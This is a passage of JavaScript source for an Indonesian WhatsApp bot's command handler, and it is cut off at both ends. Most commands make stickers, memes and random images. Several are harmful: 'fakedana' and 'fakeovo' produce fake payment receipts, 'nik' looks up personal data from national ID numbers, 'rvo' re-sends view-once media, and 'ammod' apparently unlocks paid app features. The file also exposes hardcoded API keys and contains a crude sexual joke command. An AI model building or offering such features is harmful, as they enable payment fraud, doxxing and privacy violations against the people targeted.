      text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti."
    }, { quoted: qR9X });
  }
}
break
case "bratvid": {
  if (!text) return example("teksnya");
  try {
    await reyz.sendMessage(m.chat, {
      react: { text: "☘️", key: m.key }
    });

    const url = `https://api.lumi-base.my.id/canvas/brat?text=${encodeURIComponent(text)}`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    await reyz.sendVideoAsSticker(
      m.chat,
      response.data,
      m,
      {
        packname: `By: ReyzTzx
Buy Bot? Chat Telegram : t.me/reyztzx`,
        author: `ReyzTzx`
      }
    );

  } catch (err) {
    console.error("Error:", err);
    await reyz.sendMessage(m.chat, {
      text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat video. Coba lagi nanti."
    }, { quoted: qR9X });
  }
}
break
case "bratprabowo":
case "bratnaruto":
case "bratanime":
case "bratgojo":
case "bratpatrick": {
  if (!text) return example("teksnya");
  try {
    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    const endpoint = {
      bratprabowo: "https://api-nanzz.my.id/docs/api/maker/brat/brat-prabowo.php",
      bratnaruto: "https://api-nanzz.my.id/docs/api/maker/brat/brat-naruto.php",
      bratanime: "https://api-nanzz.my.id/docs/api/maker/brat/brat-anime-cewe.php",
      bratgojo: "https://api-nanzz.my.id/docs/api/maker/brat/brat-gojo.php",
      bratpatrick: "https://api-nanzz.my.id/docs/api/maker/brat/brat-patrick.php",
    }[command];

    const url = `${endpoint}?text=${encodeURIComponent(text)}`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    await reyz.sendImageAsSticker(
      m.chat,
      response.data,
      m,
      {
        packname: `By: ReyzTzx
Buy Bot? Chat Telegram : t.me/reyztzx`,
        author: `ReyzTzx`
      }
    );

  } catch (err) {
    console.error("Error:", err);
    reply("❌ Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.");
  }
}
break
case "sticker":
case "stiker":
case "sgif":
case "s": {
  if (!/image|video|webp/.test(mime)) return example("Kirim atau reply gambar/video (maks 15 detik)");

  // batasin durasi video biar gak berat
  if (/video/.test(mime) && (qmsg?.seconds > 15)) {
    return reply("✖️ Durasi video maksimal 15 detik.");
  }

  await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

  let media;
  try {
    // download ke file sementara
    media = await reyz.downloadAndSaveMediaMessage(qmsg);

    // kirim sesuai tipe
    if (/image|webp/.test(mime)) {
      await reyz.sendImageAsSticker(
        m.chat,
        media,
        m,
        { packname: `By: ReyzTzx
Buy Bot? Chat Telegram : t.me/reyztzx`, author: `ReyzTzx` }
      );
    } else if (/video/.test(mime)) {
      await reyz.sendVideoAsSticker(
        m.chat,
        media,
        m,
        { packname: `By: ReyzTzx
Buy Bot? Chat Telegram : t.me/reyztzx`, author: `ReyzTzx` }
      );
    } else {
      return reply("✖️ Format tidak didukung. Kirim gambar atau video pendek.");
    }

  } catch (e) {
    console.error("sticker cmd error:", e);
    reply("✖️ Terjadi kesalahan saat mengeksekusi perintah.");
  } finally {
    try { if (media && fs.existsSync(media)) fs.unlinkSync(media); } catch {}
  }
}
break

case "smeme": {
  if (!/image|webp/.test(mime)) {
    return example("Kirim atau reply gambar/webp dengan teks atas|bawah");
  }

  let [atas, bawah] = text.split("|");

  if (!atas) {
    return example("teksatas|teksbawah (teks bawah opsional)");
  }

  await reyz.sendMessage(m.chat, {
    react: {
      text: "☘️",
      key: m.key
    }
  });

  let media, uploadedUrl, tempFile;

  try {
    media = await reyz.downloadAndSaveMediaMessage(qmsg);
    tempFile = media;

    uploadedUrl = await uploader.uguu(tempFile);

    const params = new URLSearchParams({
      img: uploadedUrl,
      atas: atas,
      bawah: bawah || "",
      apikey: "sylva-VRhU5Zcj"
    });

    const apiUrl = `https://sylvatica.my.id/api/tools/smeme?${params.toString()}`;

    const { data, status } = await axios.get(apiUrl, {
      responseType: "arraybuffer",
      validateStatus: () => true
    });

    if (status !== 200) {
      const errorText = Buffer.from(data).toString("utf-8");
      throw new Error(`API mengembalikan status ${status}: ${errorText}`);
    }

    if (!data || data.length === 0) {
      throw new Error("API tidak mengembalikan hasil");
    }

    await reyz.sendImageAsSticker(
      m.chat,
      data,
      m,
      {
        packname: `By: ReyzTzx
Buy Bot? Chat Telegram : t.me/reyztzx`,
        author: "ReyzTzx"
      }
    );
  } catch (err) {
    console.error("❌ smeme cmd error:", err);
    reply(`✖️ Terjadi kesalahan saat membuat meme:\n${err.message || err}`);
  } finally {
    try {
      if (tempFile && fs.existsSync(tempFile)) {
        fs.unlinkSync(tempFile);
      }
    } catch (cleanupErr) {
      console.error("Gagal hapus file temp:", cleanupErr);
    }
  }
}
break
case "emojimix": {
  if (!text) return example("😭+😂");

  let [emoji1, emoji2] = text.split("+");
  if (!emoji1 || !emoji2) return example("😭+😂");

  await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

  try {
    const apiUrl = `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`;

    const { data } = await axios.get(apiUrl);

    if (!data?.results?.length) {
      return reply("❌ Emoji mix tidak ditemukan.");
    }

    const imgUrl = data.results[0].media_formats.png_transparent.url;

    // download gambar
    const res = await axios.get(imgUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(res.data);

    const tempFile = `./database/emojimix-${Date.now()}.png`;
    await fs.promises.writeFile(tempFile, buffer);

    // kirim sebagai stiker
    await reyz.sendImageAsSticker(
      m.chat,
      tempFile,
      m,
      { packname: `By: ReyzTzx
Buy Bot? Chat Telegram : t.me/reyztzx`, author: `ReyzTzx` }
    );

    // hapus file temp
    try { fs.unlinkSync(tempFile); } catch {}

  } catch (err) {
    console.error("emojimix cmd error:", err);
    reply("❌ Gagal membuat emoji mix.");
  }
}
break
case "qc": {
    if (!text) return example("teksnya");

    let ppuser;

    try {
        ppuser = await reyz.profilePictureUrl(m.sender, "image");
    } catch (err) {
        console.error("profilePictureUrl error:", err);
        ppuser = "https://i.ibb.co/6BRf4Rc/no-profile.png";
    }

    let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];
    let reswarna = warna[Math.floor(Math.random() * warna.length)];

    await reyz.sendMessage(m.chat, {
        react: {
            text: "☘️",
            key: m.key
        }
    });

    try {
        const apiUrl = "https://sylvatica.my.id/api/maker/qc";

        const response = await axios.get(apiUrl, {
            params: {
                text: text,
                nama: m.pushName || "User",
                url: ppuser,
                color: reswarna,
                apikey: "sylva-VRhU5Zcj"
            },
            responseType: "arraybuffer",
            timeout: 30000
        });

        console.log("QC API STATUS:", response.status);

        const buffer = Buffer.from(response.data);

        await reyz.sendImageAsSticker(
            m.chat,
            buffer,
            m,
            {
                packname: "By: ReyzTzx\nBuy Bot? Chat Telegram : t.me/reyztzx",
                author: "ReyzTzx"
            }
        );

    } catch (err) {
        console.error("========== QC ERROR ==========");
        console.error("Name:", err?.name);
        console.error("Message:", err?.message);
        console.error("Code:", err?.code);
        console.error("Status:", err?.response?.status);
        console.error("Status Text:", err?.response?.statusText);
        console.error("Response:", err?.response?.data);
        console.error("Request URL:", err?.config?.url);
        console.error("Request Method:", err?.config?.method);
        console.error("Stack:", err?.stack);
        console.error("================================");

        reply(
            `✖️ QC Error\n\n` +
            `Name: ${err?.name || "-"}\n` +
            `Message: ${err?.message || "-"}\n` +
            `Code: ${err?.code || "-"}\n` +
            `Status: ${err?.response?.status || "-"}`
        );
    }
}
break

case "ammod": {
    if (!text) {
        return reply(
            `Format:\n${prefix + command} email|options|url\n\nContoh:\n${prefix + command} contoh@gmail.com|premium|https://example.com`
        )
    }

    const [email, options, url] = text.split("|").map(v => v.trim())

    if (!email || !options || !url) {
        return reply(
            `Format salah!\n\n${prefix + command} email|options|url`
        )
    }

    try {
        const apikey = "sylva-VRhU5Zcj"

        const api = `https://sylvatica.my.id/api/tools/alightmotion?email=${encodeURIComponent(email)}&options=${encodeURIComponent(options)}&url=${encodeURIComponent(url)}&apikey=${encodeURIComponent(apikey)}`

        const { data } = await axios.get(api)

        if (!data) {
            return reply("API tidak mengembalikan respons.")
        }

        if (data.status === false || data.success === false) {
            return reply(
                `Gagal: ${data.message || data.error || JSON.stringify(data)}`
            )
        }

        await reply(
            typeof data === "string"
                ? data
                : JSON.stringify(data, null, 2)
        )

    } catch (error) {
        console.error(error)

        return reply(
            `Error: ${
                error.response?.data?.message ||
                error.response?.data?.error ||
                error.message
            }`
        )
    }
}
break

case "claude": {
    if (!text) return reply(`Contoh:\n${prefix + command} Holla I'm Claude Ai?`)

    try {
        const apikey = process.env.SYLVA_APIKEY || "sylva-VRhU5Zcj"

        const api = `https://sylvatica.my.id/api/ai/claude?q=${encodeURIComponent(text)}&files=&apikey=${encodeURIComponent(apikey)}`

        const { data } = await axios.get(api)

        if (!data) {
            return reply("API tidak memberikan respons.")
        }

        if (data.status === false || data.success === false) {
            return reply(`Gagal: ${data.message || data.error || "Terjadi kesalahan."}`)
        }

        const result =
            data.result ||
            data.response ||
            data.answer ||
            data.message ||
            data.data

        if (!result) {
            return reply(JSON.stringify(data, null, 2))
        }

        await reply(
            typeof result === "string"
                ? result
                : JSON.stringify(result, null, 2)
        )

    } catch (error) {
        console.error(error)

        await reply(
            `Error: ${
                error.response?.data?.message ||
                error.response?.data?.error ||
                error.message
            }`
        )
    }
}
break

case "track": {
    const input = text.replace(/[^0-9]/g, "");

    if (!input) return example("628xxxxxxxxxx");

    try {
        await handlePhoneLookup(reyz, m, input, true);

        const jid = `${input}@s.whatsapp.net`;
        const locationData = global.trackLocations?.[jid];

        if (!locationData) {
            await reyz.sendMessage(
                m.chat,
                {
                    text: `📍 *TRACK LOCATION*

📞 *Nomor:* ${input}

❌ Belum ada location atau live location yang dibagikan oleh nomor ini ke bot.`
                },
                { quoted: m }
            );
            break;
        }

        const now = Date.now();
        const lastUpdate = new Date(locationData.timestamp);

        const time = lastUpdate.toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            dateStyle: "medium",
            timeStyle: "medium"
        });

        await reyz.sendMessage(
            m.chat,
            {
                text: `📍 *TRACK LOCATION*

📞 *Nomor:* ${input}
📡 *Status:* ${locationData.isLive ? "Live Location Shared" : "Last Shared Location"}
📌 *Nama:* ${locationData.name || "Tidak diketahui"}
🌐 *Latitude:* ${locationData.latitude}
🌐 *Longitude:* ${locationData.longitude}
🕒 *Last Update:* ${time}
⏱️ *Age:* ${Math.floor((now - locationData.timestamp) / 1000)} detik

🗺️ *Maps:*
https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
            },
            { quoted: m }
        );

    } catch (error) {
        console.error("Track error:", error);

        await reyz.sendMessage(
            m.chat,
            {
                text: "❌ Gagal memproses tracking."
            },
            { quoted: m }
        );
    }
}
break;

async function saveSharedLocation(reyz, m) {
    try {
        const message = m.message || {};

        const location =
            message.locationMessage ||
            message.liveLocationMessage;

        if (!location) return false;

        const latitude = location.degreesLatitude;
        const longitude = location.degreesLongitude;

        if (
            typeof latitude !== "number" ||
            typeof longitude !== "number"
        ) {
            return false;
        }

        if (!global.trackLocations) {
            global.trackLocations = {};
        }

        const jid = m.sender;

        global.trackLocations[jid] = {
            latitude,
            longitude,
            name: location.name || location.address || null,
            isLive: Boolean(message.liveLocationMessage),
            timestamp: Date.now()
        };

        return true;

    } catch (error) {
        console.error("Save location error:", error);
        return false;
    }
}

async function handlePhoneLookup(reyz, m, phoneNumber, silent = false) {
    const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");

    try {
        const apis = [
            `https://api.veriphone.io/v2/verify?phone=${cleanNumber}`,
            `https://phonevalidation.abstractapi.com/v1/?api_key=${process.env.ABSTRACT_API_KEY || "demo"}&phone=${cleanNumber}`,
            `https://numvalidate.com/api/validate?number=${cleanNumber}`
        ];

        let phoneData = null;

        for (const apiUrl of apis) {
            try {
                const response = await axios.get(apiUrl, {
                    timeout: 10000,
                    headers: {
                        "User-Agent": "Mozilla/5.0"
                    }
                });

                if (
                    response.data &&
                    (response.data.valid || response.data.country)
                ) {
                    phoneData = response.data;
                    break;
                }

            } catch {
                continue;
            }
        }

        if (!phoneData) {
            phoneData = await indonesianPrefixLookup(cleanNumber);
        }

        if (!silent) {
            const result = formatPhoneLookupResult(
                phoneData,
                cleanNumber
            );

            await reyz.sendMessage(
                m.chat,
                {
                    text: result
                },
                {
                    quoted: m
                }
            );
        }

        return phoneData;

    } catch (error) {
        throw error;
    }
}

async function indonesianPrefixLookup(phoneNumber) {
    const prefixDatabase = {
        "0811": { operator: "Telkomsel", type: "Halo", region: "Nasional" },
        "0812": { operator: "Telkomsel", type: "Simpati", region: "Nasional" },
        "0813": { operator: "Telkomsel", type: "Simpati", region: "Nasional" },
        "0821": { operator: "Telkomsel", type: "Telkomsel", region: "Nasional" },
        "0822": { operator: "Telkomsel", type: "Telkomsel", region: "Nasional" },
        "0823": { operator: "Telkomsel", type: "Telkomsel", region: "Nasional" },
        "0851": { operator: "Telkomsel", type: "Telkomsel", region: "Nasional" },
        "0852": { operator: "Telkomsel", type: "Telkomsel", region: "Nasional" },
        "0853": { operator: "Telkomsel", type: "Telkomsel", region: "Nasional" },

        "0814": { operator: "Indosat", type: "Indosat", region: "Nasional" },
        "0815": { operator: "Indosat", type: "Indosat", region: "Nasional" },
        "0816": { operator: "Indosat", type: "Indosat", region: "Nasional" },
        "0855": { operator: "Indosat", type: "Indosat", region: "Nasional" },
        "0856": { operator: "Indosat", type: "IM3", region: "Nasional" },
        "0857": { operator: "Indosat", type: "IM3", region: "Nasional" },
        "0858": { operator: "Indosat", type: "Indosat", region: "Nasional" },

        "0817": { operator: "XL", type: "XL", region: "Nasional" },
        "0818": { operator: "XL", type: "XL", region: "Nasional" },
        "0819": { operator: "XL", type: "XL", region: "Nasional" },
        "0859": { operator: "XL", type: "XL", region: "Nasional" },
        "0877": { operator: "XL", type: "XL", region: "Nasional" },
        "0878": { operator: "XL", type: "XL", region: "Nasional" },

        "0831": { operator: "AXIS", type: "AXIS", region: "Nasional" },
        "0832": { operator: "AXIS", type: "AXIS", region: "Nasional" },
        "0833": { operator: "AXIS", type: "AXIS", region: "Nasional" },
        "0838": { operator: "AXIS", type: "AXIS", region: "Nasional" },

        "0881": { operator: "Smartfren", type: "Smartfren", region: "Nasional" },
        "0882": { operator: "Smartfren", type: "Smartfren", region: "Nasional" },
        "0883": { operator: "Smartfren", type: "Smartfren", region: "Nasional" },
        "0884": { operator: "Smartfren", type: "Smartfren", region: "Nasional" },
        "0885": { operator: "Smartfren", type: "Smartfren", region: "Nasional" },
        "0886": { operator: "Smartfren", type: "Smartfren", region: "Nasional" },
        "0887": { operator: "Smartfren", type: "Smartfren", region: "Nasional" },
        "0888": { operator: "Smartfren", type: "Smartfren", region: "Nasional" },

        "0895": { operator: "Tri", type: "3", region: "Nasional" },
        "0896": { operator: "Tri", type: "3", region: "Nasional" },
        "0897": { operator: "Tri", type: "3", region: "Nasional" },
        "0898": { operator: "Tri", type: "3", region: "Nasional" },
        "0899": { operator: "Tri", type: "3", region: "Nasional" }
    };

    const localNumber = phoneNumber.startsWith("62")
        ? `0${phoneNumber.slice(2)}`
        : phoneNumber;

    const internationalNumber = phoneNumber.startsWith("62")
        ? `+${phoneNumber}`
        : `+62${phoneNumber.slice(1)}`;

    for (const [prefix, info] of Object.entries(prefixDatabase)) {
        if (localNumber.startsWith(prefix)) {
            return {
                valid: null,
                country: "Indonesia",
                country_code: "62",
                carrier: info.operator,
                line_type: "Mobile",
                location: info.region,
                international_format: internationalNumber,
                local_format: localNumber,
                additional_info: info
            };
        }
    }

    return {
        valid: null,
        country: "Indonesia",
        country_code: "62",
        carrier: "Unknown",
        line_type: "Unknown",
        location: "Unknown",
        international_format: internationalNumber,
        local_format: localNumber,
        additional_info: {
            operator: "Tidak diketahui",
            type: "Unknown",
            region: "Unknown"
        }
    };
}

function formatPhoneLookupResult(data, originalNumber) {
    const info = data.additional_info || {};

    return `
📱 *LOOKUP NOMOR TELEPON*

📞 *Nomor:* ${originalNumber}
🌍 *Negara:* ${data.country || "Tidak diketahui"}
🏢 *Operator:* ${data.carrier || info.operator || "Tidak diketahui"}
📡 *Tipe:* ${data.line_type || info.type || "Mobile"}
📍 *Wilayah Prefix:* ${data.location || info.region || "Tidak diketahui"}

🔢 *FORMAT*
• *Internasional:* ${data.international_format || `+${originalNumber}`}
• *Lokal:* ${data.local_format || originalNumber}

ℹ️ Informasi operator/wilayah berdasarkan validasi API atau prefix nomor.
    `.trim();
}
case "nik": {
    if (!text) return example("nik");

    const nik = text.replace(/\D/g, "");

    if (nik.length !== 16) {
        return reply("NIK harus terdiri dari 16 digit.");
    }

    try {
        await reyz.sendMessage(m.chat, {
            react: {
                text: "☘️",
                key: m.key
            }
        });

        const response = await axios.get(
            `https://sylvatica.my.id/api/tools/nik?nik=${encodeURIComponent(nik)}&apikey=sylva-VRhU5Zcj`
        );

        const data = response.data;

        console.log(
            "NIK API RESPONSE:",
            JSON.stringify(data, null, 2)
        );

        await reyz.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

        return reply(
            JSON.stringify(data, null, 2)
        );

    } catch (error) {
        console.error(
            "NIK Error:",
            error?.response?.data || error.message
        );

        await reyz.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });

        return reply(
            `Gagal mengambil response API.\n\n` +
            `${error?.response?.data?.message || error.message}`
        );
    }
}
break;
//——————————[ Case Fitur Converter ]——————————//
case "toimg": {
    let quoted = m.quoted ? m.quoted : m;
    let mime = (quoted.msg || quoted).mimetype || "";
    if (!/webp/.test(mime)) return example(" Sambil Kirim atau reply sticker untuk diubah jadi gambar.");

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        let mediaPath = await reyz.downloadAndSaveMediaMessage(quoted);
        let url = await uploader.uguu(mediaPath);

        if (!url) {
            if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
            return reply("❌ Gagal upload sticker.");
        }

        await reyz.sendMessage(
            m.chat,
            { image: { url }, caption: `✅ *Sticker berhasil diubah jadi gambar*\n📎 URL: ${url}` },
            { quoted: qR9X }
        );

        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error(err);
        reply(`❌ Error: ${err.message}`);
    }
}
break
case "tourl": {
    if (!m.quoted) return example(`Reply media yang mau diupload.\nContoh: *${prefix+command}*`);
    let mime = (m.quoted.msg || m.quoted).mimetype || "";
    if (!mime) return reply("Media tidak ditemukan.");

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        let mediaPath = await reyz.downloadAndSaveMediaMessage(m.quoted);
        let url = await uploader.catbox(mediaPath);
        await reply(`✅ *Berhasil Upload*\n\n📎 *URL:* ${url}`);
        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error(err);
        reply(`❌ Gagal upload: ${err.message}`);
    }
}
break

//——————————[ Case Fitur Random ]——————————//
case "bluearchive":
case "ba": {
    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } })

    try {
        let res = await axios.get("https://api.ryuu-dev.offc.my.id/random/ba", {
            responseType: "arraybuffer"
        })
        let buffer = Buffer.from(res.data)

        await reyz.sendMessage(
            m.chat,
            { image: buffer, caption: "✅ *Random Blue Archive Waifu*" },
            { quoted: qR9X }
        )
    } catch (err) {
        console.error(err)
        reply(`❌ Error: ${err.message}`)
    }
}
break
case "cosba":
case "cosplayba": {
    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } })

    try {
        let res = await axios.get("https://api.ryuu-dev.offc.my.id/random/cosplay-ba", {
            responseType: "arraybuffer"
        })
        let buffer = Buffer.from(res.data)

        await reyz.sendMessage(
            m.chat,
            { image: buffer, caption: "✅ *Random Blue Archive Cosplay*" },
            { quoted: qR9X }
        )
    } catch (err) {
        console.error(err)
        reply(`❌ Error: ${err.message}`)
    }
}
break
case'cekkhodam': 
 if (!text) return reply('Nama nya mana yang mau di cek khodam nya')
function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
}
 reply(`
╭━━━━° [ *Khodam ${text}* 」°
┃
┊• Nama : ${text}
┊• Khodam : ${pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang'])}
┊• Mendampingi dari : ${pickRandom(['1 tahun lalu','2 tahun lalu','3 tahun lalu','4 tahun lalu','dari lahir'])}
┃• Expired : ${pickRandom(['2024','2025','2026','2027','2028','2029','2030','2031','2032','2033','2034','2035'])}
╰═┅═━––––––๑`)
break
case'cekkontol': 
 if (!text) return reply('Nama nya mana yang mau di cek kontol nya')
 reply(`
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┃• Kontol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• True : ${pickRandom(['perjaka','ga perjaka','udah pernah dimasukin','masih ori','jumbo'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
┃• ukuran : ${pickRandom(['1cm','2cm','3cm','4cm','5cm','20cm','45cm','50cm','90meter','150meter','5km','gak normal'])}
╰═┅═━––––––๑`)
break
case 'cekdevice': {
    if (!m.quoted) return example(`reply target`)
    try {
        let device = getdevice(m.quoted)
        reply(`📱 DEVICE DETECTOR 👤 User : ${m.quoted.sender.split("@")[0]} 📲 Device : *${device}*`, { mentions: [m.quoted.sender] })
    } catch (e) {
        reply("❌ Terjadi error saat membaca device!")
    }
}
break
case "getpp": {
    if (!m.quoted && !m.mentionedJid?.length) {
        return example(`Tag atau reply user target.\n\nContoh: *${prefix + command} @user*`)
    }

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } })

    try {
        let target
        if (m.quoted) {
            target = m.quoted.sender
        } else if (m.mentionedJid?.length) {
            target = m.mentionedJid[0]
        } else {
            target = m.sender
        }
        let no = target.split("@")[0]
        let pp
        try {
            pp = await reyz.profilePictureUrl(target, "image")
        } catch {
            return reply("❌ User tidak punya foto profil atau disembunyikan.")
        }

        await reyz.sendMessage(
            m.chat,
            {
                image: { url: pp },
                caption: `✅ Foto profil @${no}`,
                mentions: [target]
            },
            { quoted: qR9X }
        )

    } catch (err) {
        console.error(err)
        reply("❌ Gagal mengambil foto profil.")
    }
}
break
case "pinterest":
case "pin": {
    if (!text) return example(`Masukkan query!\n\n*Contoh:* ${prefix + command} Sunaookami Shiroko`)

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } })

    try {
        let { data } = await axios.get(`https://api.ryuu-dev.offc.my.id/search/pinterest?query=${encodeURIComponent(text)}`)
        if (!data.status || !data.result?.length) return reply("❌ Tidak ada hasil ditemukan.")

        // ambil random dari result
        let res = data.result[Math.floor(Math.random() * data.result.length)]

        let caption = `✅ *Pinterest Result*\n\n` +
                      `👤 Uploader: *${res.fullname || res.upload_by}*\n` +
                      `👥 Followers: *${res.followers}*\n` +
                      `💬 Caption: ${res.caption || "-"}\n` +
                      `🔗 Source: ${res.source}`

        await reyz.sendMessage(
            m.chat,
            { image: { url: res.image }, caption },
            { quoted: qR9X }
        )
    } catch (err) {
        console.error(err)
        reply(`❌ Error: ${err.message}`)
    }
}
break
case "iqc": {
  if (!text) return example("teks nya");

  await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

  try {
    let jam = new Date().toLocaleTimeString("id-ID", {
      timeZone: "Asia/Jakarta",
      hour: "2-digit",
      minute: "2-digit"
    });

    let batre = Math.floor(Math.random() * 90) + 5;

    const apiUrl = `https://api-faa.my.id/faa/iqcv2?prompt=${encodeURIComponent(text)}&jam=${encodeURIComponent(jam)}&batre=${batre}`;

    const res = await axios.get(apiUrl, {
      responseType: "arraybuffer"
    });

    const buffer = Buffer.from(res.data);

    await reyz.sendMessage(m.chat, {
      image: buffer,
      caption: `🖼️ *Image Quote Creator*\n\n"${text}"`
    }, { quoted: qR9X });

  } catch (err) {
    console.error("iqc cmd error:", err);
    reply("❌ Gagal membuat image quote.");
  }
}
break
case "remini": case "hd": {
    let quoted = m.quoted ? m.quoted : m;
    let mime = (quoted.msg || quoted).mimetype || "";
    if (!/image/.test(mime)) return example(" Sambil kirim atau reply gambar untuk di-HD-in.");

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } });

    try {
        let mediaPath = await reyz.downloadAndSaveMediaMessage(quoted);
        let url = await uploader.uguu(mediaPath);

        // API upscale 4K
        let apiUrl = `https://api-faa.my.id/faa/hdv2?url=${encodeURIComponent(url)}`;
        let { data } = await axios.get(apiUrl);

        if (!data.status || !data.result) {
            if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
            return reply(`❌ Gagal memproses gambar: ${data.message || 'Unknown error'}`);
        }

        await reyz.sendMessage(
            m.chat,
            { image: { url: data.result }, caption: `✅ *Successful Upscale 4k Quality*\n📎 URL: ${data.result}` },
            { quoted: qR9X }
        );

        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error(err);
        reply(`❌ Error: ${err.message}`);
    }
}
break
case "rvo": {
    if (!m.quoted) {
        return example(`reply pesan sekali liat`);
    }

    try {
        const buffer = await m.quoted.download();
        const type = m.quoted.mtype;
        const sendOptions = { quoted: qR9X };

        if (type === "videoMessage") {
            await reyz.sendMessage(
                m.chat,
                {
                    video: buffer,
                    caption: m.quoted.text || m.quoted.caption || ""
                },
                sendOptions
            );

        } else if (type === "imageMessage") {
            await reyz.sendMessage(
                m.chat,
                {
                    image: buffer,
                    caption: m.quoted.text || m.quoted.caption || ""
                },
                sendOptions
            );

        } else if (type === "audioMessage") {
            await reyz.sendMessage(
                m.chat,
                {
                    audio: buffer,
                    mimetype: "audio/mpeg",
                    ptt: m.quoted.ptt || false
                },
                sendOptions
            );

        } else {
            return reply("❌ Media View Once tidak didukung.");
        }

    } catch (err) {
        console.error("RVO Error:", err);
        reply("❌ Gagal mengambil media View Once.");
    }
}
break
case "waifu": {
    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } })

    try {
        let res = await axios.get("https://api-nanzz.my.id/docs/api/random/waifu.php", {
            responseType: "arraybuffer"
        })
        let buffer = Buffer.from(res.data)

        await reyz.sendMessage(
            m.chat,
            { image: buffer, caption: "✅ *Random Waifu Pic* 💮" },
            { quoted: qR9X }
        )
    } catch (err) {
        console.error(err)
        reply(`❌ Error: ${err.message}`)
    }
}
break

case "cecan": {
    const negara = ['thailand', 'china', 'japan', 'vietnam', 'malaysia', 'indonesia', 'korea']
    let country = (text || '').toLowerCase().trim()
    if (!country || !negara.includes(country)) {
        return example(`indonesia\n\nPilihan negara: ${negara.join(', ')}`)
    }

    await reyz.sendMessage(m.chat, { react: { text: "☘️", key: m.key } })

    try {
        let res = await axios.get(`https://api-nanzz.my.id/docs/api/random/cecan.php?country=${encodeURIComponent(country)}`, {
            responseType: "arraybuffer"
        })
        let buffer = Buffer.from(res.data)

        await reyz.sendMessage(
            m.chat,
            { image: buffer, caption: `✅ *Random Cewe Cantik - ${capital(country)}*` },
            { quoted: qR9X }
        )
    } catch (err) {
        console.error(err)
        reply(`❌ Error: ${err.message}`)
    }
}
break
case "enc64": {
  if (!text) {
    return example(`halo cantik`)
  }
  let result = Buffer.from(text, "utf-8").toString("base64")
  reply(`🔒 Pesan Rahasia Berhasil Dibuat ${result}`)
}
break
case "denc64": {
  if (!text) {
    return example(`aGFsbw==`)
  }
  try {
    let result = Buffer.from(text, "base64").toString("utf-8")
    reply(`📖 Pesan Berhasil Dibaca ${result}`)
  } catch {
    reply("❌ Pesan tidak valid")
  }
}
break

case 'fakedana': {
  if (!text) return example(`1500000`)
  if (isNaN(text)) return reply('❌ Nominal harus berupa angka!')

  try {
    let nominal = text.trim()
    let api = `https://api-nanzz.my.id/docs/api/maker/fake-dana.php?text=${encodeURIComponent(nominal)}`

    await reyz.sendMessage(m.chat, {
      image: { url: api },
      caption: `乂 *FAKE DANA*\n\n💰 Nominal : Rp${Number(nominal).toLocaleString('id-ID')}`
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e)
    reply('❌ Gagal membuat Fake Dana')
  }
}
break

case 'fakeovo': {
  if (!text) return example(`500000`)
  if (isNaN(text)) return reply('❌ Nominal harus berupa angka!')

  try {
    let nominal = text.trim()
    let api = `https://api-nanzz.my.id/docs/api/maker/fake-ovo.php?text=${encodeURIComponent(nominal)}&amount=test_value&query=test_value&q=test_value`

    await reyz.sendMessage(m.chat, {
      image: { url: api },
      caption: `乂 *FAKE OVO*\n\n💰 Nominal : Rp${Number(nominal).toLocaleString('id-ID')}`
    }, { quoted: qR9X })
  } catch (e) {
